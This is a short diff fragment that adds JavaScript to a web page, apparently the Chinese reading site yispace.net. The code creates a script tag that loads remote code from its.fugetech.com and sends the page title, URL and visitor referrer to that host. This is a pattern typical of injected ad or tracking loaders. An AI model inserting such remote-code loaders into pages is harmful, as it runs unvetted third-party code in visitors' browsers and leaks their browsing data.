@@ -1,0 +1,4 @@
+
+  var s0 = document.createElement("script");
+  s0.src = "http://its.fugetech.com/_cm.js?p=3752&k=B699A0CCE5009DE9&g=78a5b6236595472eac51b75904f465ed&lp=http%3A%2F%2Fyispace.net%2F&ti=%E7%BE%8E%E6%96%87%E7%BD%91_%E7%BE%8E%E6%96%87%E6%AC%A3%E8%B5%8F_%E7%BB%8F%E5%85%B8%E7%BE%8E%E6%96%87_%E5%8A%B1%E5%BF%97%E6%96%87%E7%AB%A0_%E4%BC%98%E7%BE%8E%E6%95%A3%E6%96%87_%E6%84%8F%E7%A9%BA%E9%97%B4%E9%98%85%E8%AF%BB%E7%BD%91&rf=http%3A%2F%2Fyispace.net%2F42763.html&from_url=" + encodeURIComponent(document.referrer);
+  document.getElementsByTagName('head')[0].appendChild(s0)
